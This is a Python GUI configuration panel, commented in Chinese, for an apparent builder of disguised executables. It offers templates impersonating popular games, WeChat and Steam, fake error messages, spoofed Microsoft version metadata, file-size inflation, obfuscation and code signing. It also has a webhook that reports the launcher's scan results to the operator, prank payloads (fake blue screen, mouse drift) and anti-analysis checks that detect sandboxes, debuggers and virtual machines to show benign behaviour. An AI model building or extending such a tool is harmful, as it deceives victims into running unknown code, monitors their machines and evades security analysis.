# -*- coding: utf-8 -*-
"""
配置面板 — v4.0 customtkinter 现代化重构

使用 customtkinter 替代 tkinter/ttk 组件，实现现代化圆角界面。
"""
import tkinter as tk

try:
    import customtkinter as ctk
except ImportError:
    raise ImportError("请安装 customtkinter: pip install customtkinter")

from tkinter import filedialog

try:
    from builder.locale.i18n import t
except ImportError:
    from locale.i18n import t  # type: ignore

# ============ 样式常量 ============
# CTkFont 需要 Tk root 窗口存在才能创建，所以延迟初始化
SECTION_FONT = None
LABEL_WIDTH = 180
ENTRY_HEIGHT = 32
CHECKBOX_FONT = None
ACCENT = "#6C5CE7"


def _init_fonts():
    """延迟初始化字体（需在 Tk root 存在后调用）。"""
    global SECTION_FONT, CHECKBOX_FONT
    if SECTION_FONT is None:
        SECTION_FONT = ctk.CTkFont(family="Microsoft YaHei", size=14, weight="bold")
    if CHECKBOX_FONT is None:
        CHECKBOX_FONT = ctk.CTkFont(size=12)


class ConfigPanel(ctk.CTkFrame):
    def __init__(self, parent):
        _init_fonts()  # 初始化字体
        super().__init__(parent, fg_color="transparent")
        self.pack(fill='both', expand=True)
        self._init_templates()
        self._setup_ui()

    def _init_templates(self):
        self.templates = {
            "原神 (Genshin Impact)": {
                "target_exe": "YuanShen.exe",
                "target_name": "原神",
                "fallback_url": "https://ys.mihoyo.com",
                "error_message": "无法定位程序输入点于动态链接库 Kernel32.dll。",
                "window_title": "正在加载游戏资源..."
            },
            "崩坏：星穹铁道 (Honkai: Star Rail)": {
                "target_exe": "StarRail.exe",
                "target_name": "崩坏：星穹铁道",
                "fallback_url": "https://sr.mihoyo.com",
                "error_message": "发生严重错误，驱动加载超时 (0x0000007b)",
                "window_title": "星穹列车连接中..."
            },
            "英雄联盟 (League of Legends)": {
                "target_exe": "LeagueClient.exe",
                "target_name": "英雄联盟",
                "fallback_url": "https://lol.qq.com",
                "error_message": "A critical component failed to initialize.",
                "window_title": "Riot Client / League of Legends"
            },
            "微信 (WeChat)": {
                "target_exe": "WeChat.exe",
                "target_name": "微信",
                "fallback_url": "https://weixin.qq.com",
                "error_message": "WeChatUpdate.exe 丢失，无法启动。",
                "window_title": "加载本地聊天记录..."
            },
            "Steam Client": {
                "target_exe": "steam.exe",
                "target_name": "Steam",
                "fallback_url": "https://store.steampowered.com",
                "error_message": "Fatal Error: Steam needs to be online to update.",
                "window_title": "Updating Steam..."
            }
        }

    # ------------------------------------------------------------------ #
    #  UI 构建工具方法
    # ------------------------------------------------------------------ #

    def _create_section(self, title: str) -> ctk.CTkFrame:
        """创建带标题的圆角分组框。"""
        wrapper = ctk.CTkFrame(self, corner_radius=10)
        wrapper.pack(fill='x', pady=(8, 0), padx=2)

        # 标题
        ctk.CTkLabel(
            wrapper, text=title,
            font=SECTION_FONT,
            text_color=ACCENT,
        ).pack(anchor='w', padx=15, pady=(10, 5))

        # 内容容器
        content = ctk.CTkFrame(wrapper, fg_color="transparent")
        content.pack(fill='x', padx=15, pady=(0, 10))
        return content

    def _create_entry_row(self, parent, label_text: str, default_value: str = "",
                          width: int = 0) -> ctk.CTkEntry:
        """创建一行 Label + Entry 输入框。"""
        row = ctk.CTkFrame(parent, fg_color="transparent")
        row.pack(fill='x', pady=3)
        ctk.CTkLabel(row, text=label_text, width=LABEL_WIDTH, anchor='w').pack(side='left')
        entry = ctk.CTkEntry(row, height=ENTRY_HEIGHT)
        if width:
            entry.configure(width=width)
            entry.pack(side='left', padx=(5, 0))
        else:
            entry.pack(side='left', fill='x', expand=True, padx=(5, 0))
        if default_value:
            entry.insert(0, default_value)
        return entry

    def _create_file_row(self, parent, label_text: str, var: tk.StringVar,
                         filetypes: list, btn_text: str = "") -> None:
        """创建一行 Label + Entry + 浏览按钮。"""
        row = ctk.CTkFrame(parent, fg_color="transparent")
        row.pack(fill='x', pady=3)
        ctk.CTkLabel(row, text=label_text, width=LABEL_WIDTH, anchor='w').pack(side='left')
        ctk.CTkEntry(row, textvariable=var, height=ENTRY_HEIGHT).pack(
            side='left', fill='x', expand=True, padx=(5, 5)
        )
        ctk.CTkButton(
            row,
            text=btn_text or t("btn_browse"),
            width=70, height=ENTRY_HEIGHT,
            fg_color="transparent",
            border_width=1,
            border_color="gray",
            hover_color=("gray85", "gray25"),
            command=lambda: self._browse_file(var, filetypes),
        ).pack(side='left')

    @staticmethod
    def _browse_file(var: tk.StringVar, filetypes: list):
        path = filedialog.askopenfilename(filetypes=filetypes)
        if path:
            var.set(path)

    # ------------------------------------------------------------------ #
    #  UI 布局
    # ------------------------------------------------------------------ #

    def _setup_ui(self):
        # 0. 快速模板选择
        tpl_frame = ctk.CTkFrame(self, fg_color="transparent")
        tpl_frame.pack(fill='x', pady=(0, 5), padx=2)
        ctk.CTkLabel(tpl_frame, text=t("lbl_template"), width=LABEL_WIDTH, anchor='w').pack(side='left')
        self.template_combo = ctk.CTkComboBox(
            tpl_frame,
            values=list(self.templates.keys()),
            state='readonly',
            command=self._on_template_selected,
            height=ENTRY_HEIGHT,
            width=350,
        )
        self.template_combo.set(t("lbl_select_template"))
        self.template_combo.pack(side='left', padx=(5, 0))

        # 1. 目标程序设置
        target_content = self._create_section(t("sec_target"))
        self.target_exe = self._create_entry_row(target_content, t("lbl_target_exe"), "YuanShen.exe")
        self.target_name = self._create_entry_row(target_content, t("lbl_target_name"), "原神")
        self.fallback_url = self._create_entry_row(target_content, t("lbl_fallback_url"), "https://ys.mihoyo.com")
        self.error_message = self._create_entry_row(
            target_content, t("lbl_error_msg"),
            "无法定位程序输入点于动态链接库 Kernel32.dll。"
        )

        # 2. 伪装设置
        disguise_content = self._create_section(t("sec_disguise"))
        self.output_name = self._create_entry_row(disguise_content, t("lbl_output_name"), "植物大战僵尸3.exe")
        self.window_title = self._create_entry_row(disguise_content, t("lbl_window_title"), "正在加载游戏资源...")

        # 图标 & Splash
        self.icon_path_var = tk.StringVar()
        self._create_file_row(disguise_content, t("lbl_icon_path"), self.icon_path_var,
                              [("Icon Files", "*.ico"), ("All Files", "*.*")])

        self.splash_path_var = tk.StringVar()
        self._create_file_row(disguise_content, t("lbl_splash_path"), self.splash_path_var,
                              [("Image Files", "*.png;*.gif"), ("All Files", "*.*")])

        # 文件膨胀
        size_row = ctk.CTkFrame(disguise_content, fg_color="transparent")
        size_row.pack(fill='x', pady=3)
        ctk.CTkLabel(size_row, text=t("lbl_target_size"), width=LABEL_WIDTH, anchor='w').pack(side='left')
        self.target_size_var = tk.StringVar(value="10")
        ctk.CTkEntry(size_row, textvariable=self.target_size_var, width=80,
                     height=ENTRY_HEIGHT).pack(side='left', padx=(5, 5))
        ctk.CTkLabel(size_row, text=t("lbl_size_hint"), text_color="gray").pack(side='left')

        # 3. 元数据伪装
        meta_content = self._create_section(t("sec_meta"))
        self.meta_company = self._create_entry_row(meta_content, t("lbl_meta_company"), "Microsoft Corporation")
        self.meta_desc = self._create_entry_row(meta_content, t("lbl_meta_desc"), "Game Client")
        self.meta_copyright = self._create_entry_row(
            meta_content, t("lbl_meta_copyright"),
            "© Microsoft Corporation. All rights reserved."
        )
        self.meta_version = self._create_entry_row(meta_content, t("lbl_meta_version"), "1.0.0.1")

        # 4. 安全选项
        sec_content = self._create_section(t("sec_security"))

        self.enable_obfuscation_var = tk.BooleanVar(value=False)
        ctk.CTkCheckBox(
            sec_content, text=t("chk_obfuscation"),
            variable=self.enable_obfuscation_var,
            font=CHECKBOX_FONT,
            checkbox_width=20, checkbox_height=20,
        ).pack(anchor='w', pady=4)

        self.enable_signing_var = tk.BooleanVar(value=False)
        ctk.CTkCheckBox(
            sec_content,
            text=t("chk_signing", "启用代码签名（可选，需本机已安装 SignTool 并准备好 PFX 证书）"),
            variable=self.enable_signing_var,
            font=CHECKBOX_FONT,
            checkbox_width=20, checkbox_height=20,
        ).pack(anchor='w', pady=(6, 4))

        self.signtool_path_var = tk.StringVar()
        self._create_file_row(sec_content, t("lbl_signtool_path", "SignTool 路径:"),
                              self.signtool_path_var,
                              [("Executable Files", "*.exe"), ("All Files", "*.*")])

        self.signing_cert_path_var = tk.StringVar()
        self._create_file_row(sec_content, t("lbl_signing_cert_path", "PFX 证书路径:"),
                              self.signing_cert_path_var,
                              [("Certificate Files", "*.pfx;*.p12"), ("All Files", "*.*")])

        pw_row = ctk.CTkFrame(sec_content, fg_color="transparent")
        pw_row.pack(fill='x', pady=3)
        ctk.CTkLabel(pw_row, text=t("lbl_signing_password", "证书密码:"),
                     width=LABEL_WIDTH, anchor='w').pack(side='left')
        self.signing_password_var = tk.StringVar()
        ctk.CTkEntry(pw_row, textvariable=self.signing_password_var, show="•",
                     height=ENTRY_HEIGHT).pack(side='left', fill='x', expand=True, padx=(5, 0))

        ts_row = ctk.CTkFrame(sec_content, fg_color="transparent")
        ts_row.pack(fill='x', pady=3)
        ctk.CTkLabel(ts_row, text=t("lbl_timestamp_url", "时间戳服务 URL:"),
                     width=LABEL_WIDTH, anchor='w').pack(side='left')
        self.timestamp_url_var = tk.StringVar(value="http://timestamp.digicert.com")
        ctk.CTkEntry(ts_row, textvariable=self.timestamp_url_var,
                     height=ENTRY_HEIGHT).pack(side='left', fill='x', expand=True, padx=(5, 0))

        ctk.CTkLabel(
            sec_content,
            text=t("msg_signing_hint", "提示: 签名密码仅本次构建使用，不会写入历史记录。"),
            text_color="gray", font=ctk.CTkFont(size=11),
        ).pack(anchor='w', pady=(2, 0))

        # 5. Webhook 战报回传
        webhook_content = self._create_section(t("sec_webhook", "Webhook 追踪"))

        self.enable_webhook_var = tk.BooleanVar(value=False)
        ctk.CTkCheckBox(
            webhook_content,
            text=t("chk_webhook", "启用 Webhook 战报回传（Launcher 执行结果推送到你的通知渠道）"),
            variable=self.enable_webhook_var,
            font=CHECKBOX_FONT,
            checkbox_width=20, checkbox_height=20,
        ).pack(anchor='w', pady=4)

        wtype_row = ctk.CTkFrame(webhook_content, fg_color="transparent")
        wtype_row.pack(fill='x', pady=3)
        ctk.CTkLabel(wtype_row, text=t("lbl_webhook_type", "推送服务类型:"),
                     width=LABEL_WIDTH, anchor='w').pack(side='left')
        self.webhook_type_var = tk.StringVar(value="custom")
        ctk.CTkComboBox(
            wtype_row,
            variable=self.webhook_type_var,
            values=["custom", "serverchan", "dingtalk", "feishu"],
            state='readonly',
            width=160, height=ENTRY_HEIGHT,
        ).pack(side='left', padx=(5, 5))
        ctk.CTkLabel(
            wtype_row,
            text=t("lbl_webhook_type_hint", "(Server酱 / 钉钉 / 飞书 / 通用JSON)"),
            text_color="gray", font=ctk.CTkFont(size=11),
        ).pack(side='left')

        wurl_row = ctk.CTkFrame(webhook_content, fg_color="transparent")
        wurl_row.pack(fill='x', pady=3)
        ctk.CTkLabel(wurl_row, text=t("lbl_webhook_url", "Webhook URL:"),
                     width=LABEL_WIDTH, anchor='w').pack(side='left')
        self.webhook_url_var = tk.StringVar()
        ctk.CTkEntry(wurl_row, textvariable=self.webhook_url_var,
                     height=ENTRY_HEIGHT).pack(side='left', fill='x', expand=True, padx=(5, 0))

        ctk.CTkLabel(
            webhook_content,
            text=t("msg_webhook_hint", "提示: Launcher 将在扫描结束后异步发送结果到此地址，不影响主流程。"),
            text_color="gray", font=ctk.CTkFont(size=11),
        ).pack(anchor='w', pady=(2, 0))

        # 6. 恶搞载荷选项
        payload_content = self._create_section(t("sec_payloads", "恶搞载荷 (可选)"))

        self.enable_bsod_var = tk.BooleanVar(value=False)
        ctk.CTkCheckBox(
            payload_content,
            text=t("chk_bsod", "蓝屏伪装 — 未找到目标时显示高仿 Windows 蓝屏画面"),
            variable=self.enable_bsod_var,
            font=CHECKBOX_FONT,
            checkbox_width=20, checkbox_height=20,
        ).pack(anchor='w', pady=2)

        self.enable_audio_var = tk.BooleanVar(value=False)
        ctk.CTkCheckBox(
            payload_content,
            text=t("chk_audio", "搞怪音效 — 后台播放蜂鸣音序列"),
            variable=self.enable_audio_var,
            font=CHECKBOX_FONT,
            checkbox_width=20, checkbox_height=20,
        ).pack(anchor='w', pady=2)

        melody_row = ctk.CTkFrame(payload_content, fg_color="transparent")
        melody_row.pack(fill='x', pady=2, padx=(28, 0))
        ctk.CTkLabel(melody_row, text=t("lbl_audio_melody", "音效类型:"),
                     width=100, anchor='w').pack(side='left')
        self.audio_melody_var = tk.StringVar(value="random_chaos")
        ctk.CTkComboBox(
            melody_row,
            variable=self.audio_melody_var,
            values=["random_chaos", "alarm", "error_beep", "ascending",
                    "descending", "windows_error", "doorbell"],
            state='readonly',
            width=160, height=ENTRY_HEIGHT,
        ).pack(side='left', padx=(5, 0))

        self.enable_mouse_drift_var = tk.BooleanVar(value=False)
        ctk.CTkCheckBox(
            payload_content,
            text=t("chk_mouse_drift", "鼠标漂移 — 让鼠标短时间不听使唤"),
            variable=self.enable_mouse_drift_var,
            font=CHECKBOX_FONT,
            checkbox_width=20, checkbox_height=20,
        ).pack(anchor='w', pady=2)

        drift_row = ctk.CTkFrame(payload_content, fg_color="transparent")
        drift_row.pack(fill='x', pady=2, padx=(28, 0))
        ctk.CTkLabel(drift_row, text=t("lbl_drift_intensity", "漂移强度 (1-10):"),
                     width=120, anchor='w').pack(side='left')
        self.drift_intensity_var = tk.StringVar(value="3")
        ctk.CTkEntry(drift_row, textvariable=self.drift_intensity_var,
                     width=60, height=ENTRY_HEIGHT).pack(side='left', padx=(5, 15))
        ctk.CTkLabel(drift_row, text=t("lbl_drift_duration", "持续秒数:"),
                     width=80, anchor='w').pack(side='left')
        self.drift_duration_var = tk.StringVar(value="15")
        ctk.CTkEntry(drift_row, textvariable=self.drift_duration_var,
                     width=60, height=ENTRY_HEIGHT).pack(side='left', padx=(5, 0))

        # 7. 反分析检测
        aa_content = self._create_section(t("sec_anti_analysis", "反分析检测"))

        self.enable_anti_analysis_var = tk.BooleanVar(value=False)
        ctk.CTkCheckBox(
            aa_content,
            text=t("chk_anti_analysis", "启用反分析 — 检测沙箱/调试器/虚拟机环境，异常时显示良性行为后退出"),
            variable=self.enable_anti_analysis_var,
            font=CHECKBOX_FONT,
            checkbox_width=20, checkbox_height=20,
        ).pack(anchor='w', pady=4)

        ctk.CTkLabel(
            aa_content,
            text=t("msg_anti_analysis_hint", "检测项: CPU核心数/内存/磁盘/运行时间/MAC地址/调试器/分析工具进程等 11 项指标"),
            text_color="gray", font=ctk.CTkFont(size=11),
        ).pack(anchor='w', pady=(2, 0))

    # ------------------------------------------------------------------ #
    #  事件处理
    # ------------------------------------------------------------------ #

    def _on_template_selected(self, selected):
        if selected in self.templates:
            tpl = self.templates[selected]
            self.set_config(tpl)

    # ------------------------------------------------------------------ #
    #  配置读写
    # ------------------------------------------------------------------ #

    def get_config(self) -> dict:
        """获取所有配置数据"""
        # Read splash image into Base64
        splash_data = ""
        splash_p = self.splash_path_var.get().strip()
        if splash_p and __import__("os").path.exists(splash_p):
            try:
                import base64
                with open(splash_p, "rb") as bf:
                    splash_data = base64.b64encode(bf.read()).decode("utf-8")
            except Exception:
                pass  # Ignore error

        return {
            "target_exe": self.target_exe.get().strip(),
            "target_name": self.target_name.get().strip(),
            "fallback_url": self.fallback_url.get().strip(),
            "error_message": self.error_message.get().strip(),
            "output_name": self.output_name.get().strip(),
            "window_title": self.window_title.get().strip(),
            "icon_path": self.icon_path_var.get().strip(),
            "splash_path": splash_p,
            "splash_image_data": splash_data,
            "target_size_mb": float(self.target_size_var.get() or 0),
            "meta_company": self.meta_company.get().strip(),
            "meta_desc": self.meta_desc.get().strip(),
            "meta_copyright": self.meta_copyright.get().strip(),
            "meta_version": self.meta_version.get().strip(),
            "enable_obfuscation": self.enable_obfuscation_var.get(),
            "enable_signing": self.enable_signing_var.get(),
            "signtool_path": self.signtool_path_var.get().strip(),
            "signing_cert_path": self.signing_cert_path_var.get().strip(),
            "signing_password": self.signing_password_var.get(),
            "timestamp_url": self.timestamp_url_var.get().strip(),
            # v4.0: Webhook
            "enable_webhook": self.enable_webhook_var.get(),
            "webhook_type": self.webhook_type_var.get().strip(),
            "webhook_url": self.webhook_url_var.get().strip(),
            # v4.0: Payloads
            "enable_bsod": self.enable_bsod_var.get(),
            "enable_audio": self.enable_audio_var.get(),
            "audio_melody": self.audio_melody_var.get().strip(),
            "enable_mouse_drift": self.enable_mouse_drift_var.get(),
            "drift_intensity": int(self.drift_intensity_var.get() or 3),
            "drift_duration": float(self.drift_duration_var.get() or 15),
            # v4.0: Anti-Analysis
            "enable_anti_analysis": self.enable_anti_analysis_var.get(),
        }

    def set_config(self, cfg: dict):
        """加载历史配置数据"""
        if not cfg:
            return

        # 映射：配置键 → tk 变量
        var_map = {
            "target_size_mb": (self.target_size_var, str),
            "icon_path": (self.icon_path_var, str),
            "splash_path": (self.splash_path_var, str),
            "enable_obfuscation": (self.enable_obfuscation_var, bool),
            "enable_signing": (self.enable_signing_var, bool),
            "signtool_path": (self.signtool_path_var, str),
            "signing_cert_path": (self.signing_cert_path_var, str),
            "timestamp_url": (self.timestamp_url_var, str),
            # v4.0: Webhook
            "enable_webhook": (self.enable_webhook_var, bool),
            "webhook_type": (self.webhook_type_var, str),
            "webhook_url": (self.webhook_url_var, str),
            # v4.0: Payloads
            "enable_bsod": (self.enable_bsod_var, bool),
            "enable_audio": (self.enable_audio_var, bool),
            "audio_melody": (self.audio_melody_var, str),
            "enable_mouse_drift": (self.enable_mouse_drift_var, bool),
            "drift_intensity": (self.drift_intensity_var, str),
            "drift_duration": (self.drift_duration_var, str),
            # v4.0: Anti-Analysis
            "enable_anti_analysis": (self.enable_anti_analysis_var, bool),
        }

        for k, v in cfg.items():
            if k in var_map:
                var, converter = var_map[k]
                var.set(converter(v))
            elif hasattr(self, k) and isinstance(getattr(self, k), ctk.CTkEntry):
                entry = getattr(self, k)
                entry.delete(0, 'end')
                entry.insert(0, str(v))
